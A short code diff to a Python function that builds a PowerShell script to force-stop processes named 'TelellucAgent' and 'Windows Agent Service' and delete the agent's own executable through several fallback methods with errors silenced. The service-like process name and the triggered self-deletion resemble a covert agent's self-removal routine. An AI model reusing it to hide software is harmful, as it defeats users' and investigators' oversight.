@@ -163,15 +163,17 @@ def self_delete_agent(trigger_id):
     target_path_escaped = target_path.replace("'", "''")
     script = f"""
 $target = [System.IO.Path]::GetFullPath('{target_path_escaped}');
-Start-Sleep -Seconds 2;
+Start-Sleep -Seconds 1;
 Stop-Process -Name 'TelellucAgent' -Force -ErrorAction SilentlyContinue;
 Stop-Process -Name 'Windows Agent Service' -Force -ErrorAction SilentlyContinue;
-for ($i = 0; $i -lt 10; $i++) {{
-    try {{
-        Remove-Item -LiteralPath $target -Force -ErrorAction Stop;
-        break
-    }} catch {{
-        Start-Sleep -Seconds 1
+Stop-Process -Name 'Windows Agent Service' -Force -ErrorAction SilentlyContinue;
+Start-Sleep -Seconds 1;
+if (Test-Path $target) {{
+    cmd /c "del /f /q \"$target\"" 2>$null
+    cmd /c "ren \"$target\" \"$([System.IO.Path]::GetFileNameWithoutExtension($target))_.tmp\"" 2>$null
+    Start-Sleep -Seconds 1
+    if (Test-Path $target) {{
+        cmd /c "powershell -NoProfile -Command \"Remove-Item -LiteralPath '$target' -Force -ErrorAction SilentlyContinue\"" 2>$null
     }}
 }}
 """
